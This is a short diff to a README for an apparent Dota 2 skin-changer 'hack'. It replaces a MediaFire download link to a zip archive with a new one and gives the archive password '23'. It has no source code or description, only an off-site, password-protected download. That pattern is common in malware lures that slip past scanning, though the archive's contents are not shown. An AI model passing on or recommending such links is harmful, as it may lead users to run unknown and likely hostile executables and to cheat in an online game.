@@ -1,7 +1,7 @@
 # HYROCOPT-Dota-2-SkinChanger-Script-Hack
 # Download Hack
 
-|[Download](https://www.mediafire.com/file/su5ghg4nmqv0dks/HYROCOPT_HACK.zip/file)|
+|[Download](https://www.mediafire.com/file/l58b24ooqwio65b/HYROCOPT_HACK.zip/file)|
 |:-------------|
 Passwrod: 23
 
